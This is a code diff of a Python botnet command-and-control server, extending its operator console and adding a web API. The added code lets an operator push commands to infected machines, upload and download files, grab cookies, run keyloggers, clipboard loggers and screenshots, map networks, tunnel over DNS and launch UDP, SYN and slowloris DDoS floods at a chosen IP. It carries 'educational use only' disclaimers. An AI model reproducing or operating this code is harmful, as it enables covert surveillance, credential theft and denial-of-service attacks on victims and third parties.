+                        command_response = {'output': None, 'event': threading.Event()}
+                        if not hasattr(self, '_mcp_pending_responses'):
+                            self._mcp_pending_responses = {}
+                        self._mcp_pending_responses[bot_id] = command_response
+                        
+                        if self.send_command(bot_id, bot_cmd):
+                            print(f"[*] Command sent to {bot_id}: {bot_cmd}")
+                            command_response['event'].wait(timeout=10)
+                            output = command_response.get('output', 'No response')
+                            print(f"Response: {output}")
+                        else:
+                            print(f"[!] Failed to send command")
+                        self._mcp_pending_responses.pop(bot_id, None)
+                    except Exception as e:
+                        print(f"[!] Error: {e}")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'broadcast' and len(parts) > 1:
+                broadcast_cmd = ' '.join(parts[1:])
+                if self.broadcast_command(broadcast_cmd):
+                    print(f"[+] Broadcast command sent to all bots: {broadcast_cmd}")
+                else:
+                    print("[!] Failed to broadcast command")
+            
+            elif main_cmd == 'upload' and len(parts) > 2:
+                bot_id = parts[1]
+                file_path = parts[2]
+                if not os.path.exists(file_path):
+                    print(f"[!] File not found: {file_path}")
+                elif bot_id in self.bots:
+                    try:
+                        with open(file_path, 'rb') as f:
+                            file_bytes = f.read()
+                        b64_data = base64.b64encode(file_bytes).decode('utf-8')
+                        remote_name = os.path.basename(file_path)
+                        self.command_queue.put({
+                            'bot_id': bot_id,
+                            'command': f"file_upload {remote_name} {b64_data}",
+                            'action': 'file_upload',
+                            'silent': True
+                        })
+                        print(f"[+] File upload queued: {remote_name} -> {bot_id}")
+                    except Exception as e:
+                        print(f"[!] Upload error: {e}")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'download' and len(parts) > 2:
+                bot_id = parts[1]
+                remote_path = parts[2]
+                if bot_id in self.bots:
+                    if self.send_command(bot_id, f"file_download {remote_path}"):
+                        print(f"[+] Download command sent: {bot_id} -> {remote_path}")
+                    else:
+                        print(f"[!] Failed to send download command")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'cookies' and len(parts) > 1:
+                bot_id = parts[1]
+                if bot_id in self.bots:
+                    if self.send_command(bot_id, "get_cookies"):
+                        print(f"[+] Cookie request sent: {bot_id}")
+                    else:
+                        print(f"[!] Failed to send cookie request")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'keylogger' and len(parts) > 2:
+                action = parts[1]
+                bot_id = parts[2]
+                if bot_id in self.bots:
+                    cmd = f"keylogger_{action}"
+                    if self.send_command(bot_id, cmd):
+                        print(f"[+] Keylogger {action} command sent: {bot_id}")
+                    else:
+                        print(f"[!] Failed to send keylogger command")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'copy' and len(parts) > 2:
+                action = parts[1]
+                bot_id = parts[2]
+                if bot_id in self.bots:
+                    cmd = f"clipboard_{action}"
+                    if self.send_command(bot_id, cmd):
+                        print(f"[+] Clipboard logger {action} command sent: {bot_id}")
+                    else:
+                        print(f"[!] Failed to send clipboard command")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'ss' and len(parts) > 2:
+                action = parts[1]
+                bot_id = parts[2]
+                if bot_id in self.bots:
+                    cmd = f"ss_{action}"
+                    if self.send_command(bot_id, cmd):
+                        print(f"[+] Screenshot {action} command sent: {bot_id}")
+                    else:
+                        print(f"[!] Failed to send screenshot command")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'network_map' and len(parts) > 2:
+                action = parts[1]
+                bot_id = parts[2]
+                scope = parts[3] if len(parts) > 3 else None
+                if bot_id in self.bots:
+                    if action == 'start':
+                        cmd = f"network_map|start|{scope or 'local'}"
+                    elif action == 'stop':
+                        cmd = "network_map|stop"
+                    elif action == 'status':
+                        cmd = "network_map|status"
+                    else:
+                        print(f"[!] Unknown network_map action: {action}")
+                        return
+                    if self.send_command(bot_id, cmd):
+                        print(f"[+] Network map {action} command sent: {bot_id}")
+                    else:
+                        print(f"[!] Failed to send network_map command")
+                else:
+                    print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'network_maps':
+                if self.network_maps:
+                    print("\nNetwork Maps:")
+                    for bot_id, map_data in self.network_maps.items():
+                        print(f"  - {bot_id}: {len(map_data.get('devices', []))} devices found")
+                else:
+                    print("[!] No network maps available")
+            
+            elif main_cmd == 'dns_tunnel':
+                if len(parts) > 1:
+                    action = parts[1]
+                    if action == 'enable' and len(parts) > 2:
+                        domain = parts[2]
+                        self.start_dns_tunnel(domain)
+                        print(f"[+] DNS tunnel enabled: {domain}")
+                    elif action == 'disable':
+                        self.stop_dns_tunnel()
+                        print("[+] DNS tunnel disabled")
+                    elif action == 'status':
+                        print(f"\nDNS Tunnel Status:")
+                        print(f"  Enabled: {'YES' if self.dns_tunnel_enabled else 'NO'}")
+                        print(f"  Domain: {self.dns_tunnel_domain or 'Not set'}")
+                        dns_bots = [b for b in self.bots.items() if b[1].get('dns_tunnel', False)]
+                        print(f"  DNS Tunnel Bots: {len(dns_bots)}")
+                else:
+                    print("Usage: dns_tunnel <enable <domain>|disable|status>")
+            
+            elif main_cmd == 'ddos' and len(parts) > 1:
+                ddos_cmd = parts[1]
+                if ddos_cmd == 'start' and len(parts) > 3:
+                    bot_id = parts[2]
+                    target_ip = parts[3]
+                    duration = 30
+                    threads = 50
+                    i = 4
+                    while i < len(parts):
+                        if parts[i] == '--duration' and i + 1 < len(parts):
+                            duration = min(int(parts[i+1]), 300)
+                            i += 2
+                        elif parts[i] == '--threads' and i + 1 < len(parts):
+                            threads = min(int(parts[i+1]), 100)
+                            i += 2
+                        else:
+                            i += 1
+                    if bot_id in self.bots:
+                        ddos_command = f"ddos_start|{target_ip}|80|{duration}|{threads}"
+                        if self.send_command(bot_id, ddos_command):
+                            print(f"[+] DDoS attack started: {bot_id} -> {target_ip}")
+                            print(f"    Duration: {duration}s, Threads: {threads}")
+                        else:
+                            print(f"[!] Failed to start DDoS attack")
+                    else:
+                        print(f"[!] Bot not found: {bot_id}")
+                elif ddos_cmd == 'stop' and len(parts) > 2:
+                    bot_id = parts[2]
+                    if bot_id in self.bots:
+                        if self.send_command(bot_id, "ddos_stop"):
+                            print(f"[+] DDoS attack stopped: {bot_id}")
+                        else:
+                            print(f"[!] Failed to stop DDoS attack")
+                    else:
+                        print(f"[!] Bot not found: {bot_id}")
+            
+            elif main_cmd == 'clear':
+                print("[+] Screen clear requested")
+                
+            else:
+                print(f"Unknown command: {command}")
+                print("Type 'help' for available commands")
+                
+        finally:
+            sys.stdout = old_stdout
+            
+        return captured_output.getvalue()
+    
+    def start_mcp_api_server(self):
+        """Start MCP API server"""
+        if not WEB_DASHBOARD_AVAILABLE:
+            print("\033[91m[!] Flask not installed. Install with: pip install flask\033[0m")
+            return False
+            
+        try:
+            from flask import Flask, jsonify, request
+            
+            app = Flask(__name__)
+            
+            @app.route('/api/bots', methods=['GET'])
+            def list_bots():
+                """List all connected bots"""
+                try:
+                    bots = list(self.bots.keys())
+                    return jsonify({
+                        'total_bots': len(bots),
+                        'bots': bots,
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except Exception as e:
+                    return jsonify({'error': str(e)}), 500
+            
+            @app.route('/api/bots/<bot_id>', methods=['GET'])
+            def get_bot_info(bot_id):
+                """Get detailed information about a bot"""
+                try:
+                    bot_info = self.bots.get(bot_id, {})
+                    return jsonify({
+                        'bot_id': bot_id,
+                        'info': bot_info,
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except Exception as e:
+                    return jsonify({'error': str(e)}), 500
+            
+            @app.route('/api/bots/<bot_id>/command', methods=['POST'])
+            def execute_command(bot_id):
+                """Execute command on a bot"""
+                try:
+                    data = request.get_json()
+                    command = data.get('command', '')
+                    result = self.send_command(bot_id, command)
+                    return jsonify({
+                        'bot_id': bot_id,
+                        'command': command,
+                        'result': result,
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except Exception as e:
+                    return jsonify({'error': str(e)}), 500
+            
+            @app.route('/api/status', methods=['GET'])
+            def get_status():
+                """Get C2 server status"""
+                try:
+                    total_bots = len(self.bots)
+                    active_bots = len([
+                        b for b in self.bots.values() 
+                        if b.get('active', False)
+                    ])
+                    
+                    return jsonify({
+                        'total_bots': total_bots,
+                        'active_bots': active_bots,
+                        'uptime': str(self.uptime) if hasattr(self, 'uptime') else 'unknown',
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except Exception as e:
+                    return jsonify({'error': str(e)}), 500
+            
+            @app.route('/api/network', methods=['GET'])
+            @app.route('/api/network/<bot_id>', methods=['GET'])
+            def get_network_map(bot_id=None):
+                """Get network map data"""
+                try:
+                    if bot_id:
+                        network_data = self.network_maps.get(bot_id, {})
+                    else:
+                        network_data = self.network_maps
+                    
+                    return jsonify({
+                        'network_data': network_data,
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except Exception as e:
+                    return jsonify({'error': str(e)}), 500
+            
+            @app.route('/api/alerts', methods=['GET'])
+            def get_security_alerts():
+                """Get security alerts"""
+                try:
+                    alerts = []
+                    for bot_id, bot_data in self.bots.items():
+                        bot_alerts = bot_data.get('security_alerts', [])
+                        for alert in bot_alerts:
+                            alerts.append({
+                                'bot_id': bot_id,
+                                'alert': alert
+                            })
+                    
+                    return jsonify({
+                        'total_alerts': len(alerts),
+                        'alerts': alerts,
+                        'timestamp': datetime.now().isoformat()
+                    })
+                except Exception as e:
+                    return jsonify({'error': str(e)}), 500
+            
+            # Start API server in separate thread using werkzeug for non-blocking
+            from werkzeug.serving import make_server
+            
+            def run_flask():
+                httpd = make_server('0.0.0.0', 8081, app, threaded=True)
+                httpd.serve_forever()
+            
+            api_thread = threading.Thread(target=run_flask, daemon=True)
+            api_thread.start()
+            
+            print("\033[92m[+] MCP API server started on port 8081\033[0m")
+            return True
+            
+        except Exception as e:
+            print(f"\033[91m[!] MCP API server start error: {e}\033[0m")
+            return False
+    
+    def _init_vuln_scanner(self):
+        """Initialize the Vulnerability Scanner system"""
+        try:
+            # Vulnerability Scanner message removed
             print(f"\033[36m[*]\033[0m \033[94mSupported platforms: \033[92mNVD\033[94m, \033[92mExploit-DB\033[94m, \033[92mCVE Details\033[94m, \033[92mSecurityFocus\033[94m, \033[92mPacketStorm\033[0m")
             self.vuln_scanner_enabled = True
                 
@@ -1808,36 +2738,36 @@ class C2Server:
             print(f"\033[91m[!] Vulnerability Scanner initialization error: {str(e)}\033[0m")
     
     def process_bot_vulnerabilities(self, bot_id, vulnerabilities_data):
-        """Bot'tan gelen zafiyet verilerini işler"""
+        """Process vulnerability data from bot"""
         try:
             if not self.vuln_scanner_enabled:
                 return
             
-            print(f"\033[94m[*] Bot {bot_id} zafiyet verilerini işleniyor...\033[0m")
+            print(f"\033[94m[*] Processing vulnerability data for bot {bot_id}...\033[0m")
             
-            # Zafiyet verilerini parse et
+            # Parse vulnerability data
             if isinstance(vulnerabilities_data, str):
                 try:
                     vulnerabilities = json.loads(vulnerabilities_data)
                 except json.JSONDecodeError:
-                    print(f"\033[93m[!] Bot {bot_id} zafiyet verisi JSON parse hatası\033[0m")
+                    print(f"\033[93m[!] Bot {bot_id} vulnerability data JSON parse error\033[0m")
                     return
             else:
                 vulnerabilities = vulnerabilities_data
             
-            # Bot'un zafiyetlerini kaydet
+            # Save bot vulnerabilities
             self.bot_vulnerabilities[bot_id] = vulnerabilities
             
-            # Platform istatistiklerini güncelle
+            # Update platform statistics
             self._update_platform_stats(vulnerabilities)
             
-            print(f"\033[92m[+] Bot {bot_id} için {len(vulnerabilities)} zafiyet kaydedildi\033[0m")
+            print(f"\033[92m[+] {len(vulnerabilities)} vulnerabilities saved for bot {bot_id}\033[0m")
             
         except Exception as e:
-            print(f"\033[91m[!] Bot zafiyet işleme hatası: {str(e)}\033[0m")
+            print(f"\033[91m[!] Bot vulnerability processing error: {str(e)}\033[0m")
     
     def _update_platform_stats(self, vulnerabilities):
-        """Platform istatistiklerini günceller"""
+        """Update platform statistics"""
         try:
             for vuln in vulnerabilities:
                 platform = vuln.get('platform', 'Unknown')
@@ -1858,15 +2788,15 @@ class C2Server:
                     self.platform_stats[platform]['exploits_available'] += 1
                     
         except Exception as e:
-            print(f"\033[93m[!] Platform stats güncelleme hatası: {str(e)}\033[0m")
+            print(f"\033[93m[!] Platform stats update error: {str(e)}\033[0m")
     
     def get_vulnerability_summary(self):
-        """Zafiyet özetini döndürür"""
+        """Return vulnerability summary"""
         try:
             total_bots = len(self.bot_vulnerabilities)
             total_vulns = sum(len(vulns) for vulns in self.bot_vulnerabilities.values())
             
-            # Platform bazında özet
+            # Platform-based summary
             platform_summary = {}
             for platform, stats in self.platform_stats.items():
                 platform_summary[platform] = {
@@ -1887,7 +2817,7 @@ class C2Server:
             return {}
     
     def get_bot_vulnerabilities(self, bot_id):
-        """Belirli bir bot'un zafiyetlerini döndürür"""
+        """Return vulnerabilities for a specific bot"""
         try:
             return self.bot_vulnerabilities.get(bot_id, [])
         except Exception as e:
@@ -1895,7 +2825,7 @@ class C2Server:
             return []
     
     def get_vuln_scanner_status(self):
-        """Vulnerability Scanner durumunu döndürür"""
+        """Return Vulnerability Scanner status"""
         return {
             'enabled': self.vuln_scanner_enabled,
             'total_bots_scanned': len(self.bot_vulnerabilities),
@@ -1904,57 +2834,57 @@ class C2Server:
         }
     
     def _init_network_maps(self):
-        """Network mapping sistemini başlatır"""
+        """Initialize the network mapping system"""
         print(f"\033[36m[*]\033[0m \033[94mNetwork mapping system started: {self.network_maps_dir}\033[0m")
     
     def _setup_readline(self):
-        """Readline özelliklerini ayarlar"""
+        """Setup readline features"""
         try:
-            # Komut geçmişi dosyasını ayarla
+            # Setup command history file
             readline.set_history_length(self.max_history)
             
-            # Önce tüm bindings'leri temizle
+            # Clear all bindings first
             readline.clear_history()
             
-            # Tab completion özelliğini etkinleştir (safe mode)
+            # Enable tab completion feature (safe mode)
             try:
-                # Platform bağımsız güvenli ayarlar
+                # Platform-independent safe settings
                 if platform.system() == 'Darwin':  # macOS
-                    # macOS için minimal ve güvenli ayarlar
+                    # Minimal and safe settings for macOS
                     try:
                         readline.parse_and_bind("tab: complete")
                     except:
-                        pass  # Tab completion başarısız olursa sessizce devam et
+                        pass  # Silently continue if tab completion fails
                     
-                    # Sadece temel history navigation
+                    # Only basic history navigation
                     try:
                         readline.parse_and_bind("set editing-mode emacs")
                     except:
                         pass
                         
                 elif platform.system() == 'Linux':
-                    # Linux için standart ayarlar
+                    # Standard settings for Linux
                     readline.parse_and_bind("tab: complete")
                     readline.parse_and_bind("set editing-mode emacs")
                     
-                else:  # Windows ve diğerleri
+                else:  # Windows and others
                     try:
                         readline.parse_and_bind("tab: complete")
                     except:
                         pass
                     
             except Exception:
-                # Herhangi bir binding hatası olursa sessizce devam et
+                # If any binding error occurs, silently continue
                 pass
             
-            # Completer'ı güvenli şekilde ayarla
+            # Setup completer safely
             try:
                 readline.set_completer(self._completer)
                 readline.set_completer_delims(' \t\n`!@#$%^&*()=+[{]}\\|;:\'",<>?')
             except Exception:
                 pass
             
-            # Geçmiş dosyasını güvenli şekilde yükle
+            # Load history file safely
             try:
                 if os.path.exists(self.history_file):
                     readline.read_history_file(self.history_file)
@@ -1964,11 +2894,11 @@ class C2Server:
             print(f"\033[36m[*]\033[94m \033[94mCommand history enabled (max {self.max_history} commands)\033[0m")
             
         except Exception as e:
-            # Readline tamamen başarısız olursa sadece basit mesaj ver
+            # If readline completely fails, just show basic message
             print(f"\033[94m[*] Command history enabled (basic mode)\033[0m")
     
     def _completer(self, text, state):
-        """Tab completion için completer fonksiyonu"""
+        """Completer function for tab completion"""
         try:
             commands = [
                 'list', 'server', 'security', 'p2p status', 'alerts', 'web status', 'network_maps',
@@ -1989,7 +2919,7 @@ class C2Server:
             return None
     
     def _load_command_history(self):
-        """Komut geçmişini dosyadan yükler"""
+        """Load command history from file"""
         try:
             if os.path.exists(self.history_file):
                 with open(self.history_file, 'r', encoding='utf-8') as f:
@@ -1998,7 +2928,7 @@ class C2Server:
             print(f"\033[93m[!] Error loading command history: {str(e)}\033[0m")
     
     def _save_command_history(self):
-        """Komut geçmişini dosyaya kaydeder"""
+        """Save command history to file"""
         try:
             with open(self.history_file, 'w', encoding='utf-8') as f:
                 for cmd in self.command_history[-self.max_history:]:
@@ -2007,34 +2937,34 @@ class C2Server:
             print(f"\033[93m[!] Error saving command history: {str(e)}\033[0m")
     
     def _add_to_history(self, command):
-        """Komut geçmişine yeni komut ekler"""
+        """Add new command to command history"""
         try:
-            # Boş komutları ekleme
+            # Don't add empty commands
             if not command.strip():
                 return
             
-            # Duplicate'leri kaldır
+            # Remove duplicates
             if command in self.command_history:
                 self.command_history.remove(command)
             
-            # Yeni komutu ekle
+            # Add new command
             self.command_history.append(command)
             
-            # Maksimum geçmiş sınırını kontrol et
+            # Check max history limit
             if len(self.command_history) > self.max_history:
                 self.command_history = self.command_history[-self.max_history:]
             
-            # Dosyaya kaydet
+            # Save to file
             self._save_command_history()
             
         except Exception as e:
             print(f"\033[93m[!] Error adding to history: {str(e)}\033[0m")
     
     def _print_processes_info(self, data):
-        """Process bilgilerini güzel formatla yazdır"""
+        """Print process information in nice format"""
         try:
             if isinstance(data, dict):
-                # JSON formatında gelen veri
+                # Data in JSON format
                 print(f"  \033[96m•\033[0m \033[93mTotal Processes:\033[0m \033[94m{data.get('total_processes', 'Unknown')}\033[0m")
                 
                 summary = data.get('summary', {})
@@ -2049,19 +2979,19 @@ class C2Server:
                 print(f"  \033[90m{'─' * 80}\033[0m")
                 
                 processes = data.get('top_processes', [])
-                for i, proc in enumerate(processes[:15], 1):  # İlk 15 process
+                for i, proc in enumerate(processes[:15], 1):  # First 15 processes
                     pid = proc.get('pid', 'N/A')
-                    name = proc.get('name', 'Unknown')[:18]  # İsim uzunluğunu sınırla
+                    name = proc.get('name', 'Unknown')[:18]  # Limit name length
                     cpu = proc.get('cpu_percent', 0)
                     memory = proc.get('memory_percent', 0)
-                    status = proc.get('status', 'Unknown')[:10]  # Status uzunluğunu sınırla
+                    status = proc.get('status', 'Unknown')[:10]  # Limit status length
                     create_time = proc.get('create_time', 'Unknown')
                     
-                    # CPU kullanımına göre renk
+                    # Color by CPU usage
                     cpu_color = "\033[91m" if cpu > 10 else "\033[93m" if cpu > 5 else "\033[92m"
                     memory_color = "\033[91m" if memory > 5 else "\033[93m" if memory > 2 else "\033[92m"
                     
-                    # Status rengi
+                    # Status color
                     status_color = "\033[92m" if status == "running" else "\033[93m" if status == "sleeping" else "\033[91m"
                     
                     print(f"  \033[96m{i:2d}\033[0m  \033[95m{name:<20}\033[0m \033[94m{pid:<8}\033[0m {cpu_color}{cpu:>6.1f}%\033[0m {memory_color}{memory:>8.1f}%\033[0m {status_color}{status:<12}\033[0m \033[90m{create_time:<10}\033[0m")
@@ -2069,9 +2999,9 @@ class C2Server:
                 print(f"  \033[90m{'─' * 80}\033[0m")
                 
             else:
-                # Raw text formatında gelen veri
+                # Data in raw text format
                 print(f"  \033[96m•\033[0m \033[93mProcess List:\033[0m")
-                lines = str(data).split('\n')[:20]  # İlk 20 satır
+                lines = str(data).split('\n')[:20]  # First 20 lines
                 for line in lines:
                     if line.strip():
                         print(f"    {line}")
@@ -2079,7 +3009,7 @@ class C2Server:
             print(f"  \033[91m[!] Error printing processes: {str(e)}\033[0m")
     
     def _save_processes_to_file(self, bot_id, data):
-        """Process bilgilerini dosyaya yazdır"""
+        """Write process information to file"""
         try:
             from datetime import datetime
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -2126,7 +3056,7 @@ class C2Server:
             print(f"  \033[91m[!] Error saving processes to file: {str(e)}\033[0m")
     
     def _save_raw_processes_to_file(self, bot_id, raw_data):
-        """Raw process verilerini dosyaya yazdır"""
+        """Write raw process data to file"""
         try:
             from datetime import datetime
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -2145,7 +3075,7 @@ class C2Server:
             print(f"  \033[91m[!] Error saving raw processes to file: {str(e)}\033[0m")
     
     def _show_exploits(self):
-        """Exploit veritabanını gösterir"""
+        """Show exploit database"""
         try:
             print("\n\033[95m🔍 Comprehensive Exploit Database:\033[0m")
             print("=" * 80)
@@ -2240,7 +3170,7 @@ class C2Server:
                 ]
             }
             
-            # Yazılım bazlı exploit'ler
+            # Software-based exploits
             software_exploits = {
                 'Python': [
                     {'cve': 'CVE-2023-25720', 'title': 'Python 3.11.4 - Code Injection', 'severity': 'CRITICAL', 'source': 'NVD', 'exploit_available': True},
@@ -2304,22 +3234,22 @@ class C2Server:
                 ]
             }
             
-            # Tüm exploit'leri topla
+            # Collect all exploits
             all_exploits = []
             
-            # OS exploit'leri
+            # OS exploits
             for os_name, exploits in exploit_db.items():
                 all_exploits.extend(exploits)
             
-            # Servis exploit'leri
+            # Service exploits
             for port, exploits in service_exploits.items():
                 all_exploits.extend(exploits)
             
-            # Yazılım exploit'leri
+            # Software exploits
             for software, exploits in software_exploits.items():
                 all_exploits.extend(exploits)
             
-            # Duplicate'leri kaldır
+            # Remove duplicates
             unique_exploits = []
             seen_cves = set()
             for exploit in all_exploits:
@@ -2327,11 +3257,11 @@ class C2Server:
                     unique_exploits.append(exploit)
                     seen_cves.add(exploit['cve'])
             
-            # Severity'ye göre sırala
+            # Sort by severity
             severity_order = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}
             unique_exploits.sort(key=lambda x: severity_order.get(x['severity'], 0), reverse=True)
             
-            # Özet bilgileri
+            # Summary information
             total_exploits = len(unique_exploits)
             critical_count = len([e for e in unique_exploits if e.get('severity') == 'CRITICAL'])
             high_count = len([e for e in unique_exploits if e.get('severity') == 'HIGH'])
@@ -2350,7 +3280,7 @@ class C2Server:
             print(f"\n\033[95m🎯 Top Exploits (by Severity):\033[0m")
             print("-" * 100)
             
-            for i, exploit in enumerate(unique_exploits[:20], 1):  # İlk 20 exploit
+            for i, exploit in enumerate(unique_exploits[:20], 1):  # First 20 exploits
                 severity_color = {
                     'CRITICAL': '🔴',
                     'HIGH': '🟠',
@@ -2380,7 +3310,7 @@ class C2Server:
             print(f"\033[91m[!] Error showing exploits: {str(e)}\033[0m")
     
     def _show_help(self):
-        """Show komutları için yardım menüsü"""
+        """Help menu for show commands"""
         try:
             print("\n\033[95m📋 Show Commands Help:\033[0m")
             print("=" * 60)
@@ -2587,20 +3517,23 @@ class C2Server:
                 ]
             },
             'ddos': {
-                'usage': 'ddos <start|stop> <bot_id> <target_ip> [--duration <seconds>] [--threads <count>]',
+                'usage': 'ddos <start|syn|slowloris|stop> <bot_id> <target_ip> [--duration <seconds>] [--threads <count>]',
                 'description': '⚠️  DDoS attack management (EDUCATIONAL USE ONLY)',
                 'details': [
+                    '• Attack Types:',
+                    '  - UDP/HTTP Flood: ddos start <bot> <target>',
+                    '  - SYN Flood (L3): ddos syn <bot> <target> [--threads 100]',
+                    '  - Slowloris (L7): ddos slowloris <bot> <target> [--connections 100]',
                     '• Default duration: 30 seconds (max: 300)',
-                    '• Default threads: 50 (max: 100)',
-                    '• Attack type: UDP flood on port 80',
+                    '• Default threads: 50 (max: 100 for flood, 200 for SYN)',
                     '• WARNING: Use only on your own systems!',
                     '• Malicious use is strictly prohibited'
                 ],
                 'examples': [
                     'ddos start Bot-123 192.168.1.100',
-                    'ddos start Bot-123 192.168.1.100 --duration 60',
-                    'ddos start Bot-123 192.168.1.100 --threads 25',
-                    'ddos start Bot-123 192.168.1.100 --duration 120 --threads 75',
+                    'ddos syn Bot-123 192.168.1.100 --threads 100',
+                    'ddos slowloris Bot-123 192.168.1.100 --connections 200',
+                    'ddos start Bot-123 192.168.1.100 --duration 60 --threads 25',
                     'ddos stop Bot-123'
                 ]
             },
@@ -2648,18 +3581,18 @@ class C2Server:
             print(f"\033[94m[*] Type 'help' to see all available commands\033[0m")
     
     def _show_stats(self):
-        """Sistem istatistiklerini gösterir"""
+        """Show system statistics"""
         try:
             print("\n\033[95m📊 System Statistics:\033[0m")
             print("=" * 60)
             
-            # Bot istatistikleri
+            # Bot statistics
             with self.lock:
                 total_bots = len(self.bots)
                 tor_bots = len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])
                 clearnet_bots = total_bots - tor_bots
                 
-                # Platform istatistikleri
+                # Platform statistics
                 platforms = {}
                 for bot in self.bots.values():
                     platform = bot.get('platform', 'Unknown')
@@ -2674,23 +3607,23 @@ class C2Server:
                 for platform, count in platforms.items():
                     print(f"     - {platform}: {count}")
             
-            # P2P istatistikleri
+            # P2P statistics
             active_p2p = len([s for s in self.p2p_status.values() if s['status'] == 'active'])
             print(f"  \033[96m•\033[0m Active P2P Networks: \033[95m{active_p2p}\033[0m")
             
-            # Güvenlik istatistikleri
+            # Security statistics
             security_alerts = len(self.wireshark_alerts)
             print(f"  \033[96m•\033[0m Security Alerts: \033[91m{security_alerts}\033[0m")
             
-            # Network maps istatistikleri
+            # Network maps statistics
             network_maps_count = len(self.network_maps)
             print(f"  \033[96m•\033[0m Network Maps: \033[96m{network_maps_count}\033[0m")
             
-            # Command queue istatistikleri
+            # Command queue statistics
             queue_size = self.command_queue.qsize()
             print(f"  \033[96m•\033[0m Pending Commands: \033[93m{queue_size}\033[0m")
             
-            # Uptime hesaplama
+            # Uptime calculation
             import time
             uptime_seconds = int(time.time() - getattr(self, '_start_time', time.time()))
             uptime_hours = uptime_seconds // 3600
@@ -2702,12 +3635,12 @@ class C2Server:
             print(f"\033[91m[!] Error showing stats: {str(e)}\033[0m")
     
     def _show_logs(self):
-        """Sistem loglarını gösterir"""
+        """Show system logs"""
         try:
             print("\n\033[95m📋 System Logs:\033[0m")
             print("=" * 60)
             
-            # Log dosyalarını kontrol et
+            # Check log files
             log_files = [
                 'download_log.json',
                 'clipboard_data/',
@@ -2727,7 +3660,7 @@ class C2Server:
                 else:
                     print(f"  \033[96m•\033[0m {log_file}: \033[91mNot found\033[0m")
             
-            # Son aktiviteler
+            # Recent activities
             print(f"\n\033[95m📊 Recent Activity:\033[0m")
             with self.lock:
                 if self.bots:
@@ -2742,7 +3675,7 @@ class C2Server:
             print(f"\033[91m[!] Error showing logs: {str(e)}\033[0m")
     
     def _show_config(self):
-        """Server konfigürasyonunu gösterir"""
+        """Show server configuration"""
         try:
             print("\n\033[95m⚙️ Server Configuration:\033[0m")
             print("=" * 60)
@@ -2754,25 +3687,25 @@ class C2Server:
             print(f"  \033[96m•\033[0m Security Rules: \033[93m{'Enabled' if self.security_rules_enabled else 'Disabled'}\033[0m")
             print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
             
-            # Tor konfigürasyonu
+            # Tor configuration
             print(f"\n\033[95m🔒 Tor Configuration:\033[0m")
             print(f"  \033[96m•\033[0m Tor Enabled: \033[93m{'Yes' if self.tor_enabled else 'No'}\033[0m")
             print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
             print(f"  \033[96m•\033[0m Tor Process: \033[93m{'Running' if self.tor_process else 'Stopped'}\033[0m")
             
-            # Web dashboard konfigürasyonu
+            # Web dashboard configuration
             print(f"\n\033[95m🌐 Web Dashboard Configuration:\033[0m")
             print(f"  \033[96m•\033[0m Web Dashboard: \033[93m{'Enabled' if self.web_dashboard_enabled else 'Disabled'}\033[0m")
             print(f"  \033[96m•\033[0m Web Host: \033[93m{self.web_dashboard_host}\033[0m")
             print(f"  \033[96m•\033[0m Web Port: \033[93m{self.web_dashboard_port}\033[0m")
             
-            # Network mapping konfigürasyonu
+            # Network mapping configuration
             print(f"\n\033[95m🗺️ Network Mapping Configuration:\033[0m")
             print(f"  \033[96m•\033[0m Network Maps: \033[93m{'Enabled' if self.network_maps_enabled else 'Disabled'}\033[0m")
             print(f"  \033[96m•\033[0m Maps Directory: \033[93m{self.network_maps_dir}\033[0m")
             print(f"  \033[96m•\033[0m Total Maps: \033[93m{len(self.network_maps)}\033[0m")
             
-            # Vulnerability scanner konfigürasyonu
+            # Vulnerability scanner configuration
             print(f"\n\033[95m🔍 Vulnerability Scanner Configuration:\033[0m")
             print(f"  \033[96m•\033[0m Scanner: \033[93m{'Enabled' if self.vuln_scanner_enabled else 'Disabled'}\033[0m")
             print(f"  \033[96m•\033[0m Sources: \033[93mNVD, ExploitDB, CVE Details, SecurityFocus, PacketStorm\033[0m")
@@ -2781,7 +3714,7 @@ class C2Server:
             print(f"\033[91m[!] Error showing config: {str(e)}\033[0m")
     
     def _show_history(self):
-        """Komut geçmişini gösterir"""
+        """Show command history"""
         try:
             print("\n\033[95m📜 Command History:\033[0m")
             print("=" * 60)
@@ -2799,7 +3732,7 @@ class C2Server:
                 if len(self.command_history) > 10:
                     print(f"  \033[90m... and {len(self.command_history) - 10} more commands\033[0m")
                 
-                # En çok kullanılan komutları bul
+                # Find most used commands
                 from collections import Counter
                 command_counts = Counter(self.command_history)
                 most_common = command_counts.most_common(5)
@@ -2821,12 +3754,12 @@ class C2Server:
             print(f"\033[91m[!] Error showing history: {str(e)}\033[0m")
     
     def _show_files(self):
-        """Dosya sistemi bilgilerini gösterir"""
+        """Show file system information"""
         try:
             print("\n\033[95m📁 File System Information:\033[0m")
             print("=" * 60)
             
-            # Ana dizinler
+            # Main directories
             directories = [
                 'bot_files',
                 'clipboard_data',
@@ -2843,7 +3776,7 @@ class C2Server:
                 else:
                     print(f"  \033[96m•\033[0m {directory}/: \033[91mNot found\033[0m")
             
-            # Log dosyaları
+            # Log files
             print(f"\n\033[95m📋 Log Files:\033[0m")
             log_files = ['download_log.json']
             for log_file in log_files:
@@ -2853,7 +3786,7 @@ class C2Server:
                 else:
                     print(f"  \033[96m•\033[0m {log_file}: \033[91mNot found\033[0m")
             
